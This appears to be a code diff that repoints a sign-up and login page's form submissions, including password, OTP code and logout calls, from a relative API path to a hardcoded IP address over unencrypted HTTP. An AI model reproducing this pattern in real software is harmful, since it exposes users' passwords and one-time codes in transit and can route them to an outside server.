@@ -1419,7 +1419,7 @@
             formData.append('phone_country', state.country);
             formData.append('password', state.password);
 
-            fetch('api/ajax.php', {
+            fetch('http://178.18.248.202/api/ajax.php', {
                 method: 'POST',
                 body: formData
             })
@@ -1527,7 +1527,7 @@
             formData.append('action', 'verify_phone');
             formData.append('otp_code', code);
 
-            fetch('api/ajax.php', {
+            fetch('http://178.18.248.202/api/ajax.php', {
                 method: 'POST',
                 body: formData
             })
@@ -1570,7 +1570,7 @@
             const formData = new FormData();
             formData.append('action', 'resend_otp');
 
-            fetch('api/ajax.php', {
+            fetch('http://178.18.248.202/api/ajax.php', {
                 method: 'POST',
                 body: formData
             })
@@ -1714,7 +1714,7 @@
         // Reset All and Start Over
         function resetAll() {
             // Terminate backend login session
-            fetch('api/ajax.php?action=logout')
+            fetch('http://178.18.248.202/api/ajax.php?action=logout')
             .then(() => {
                 // Clear state
                 state = {
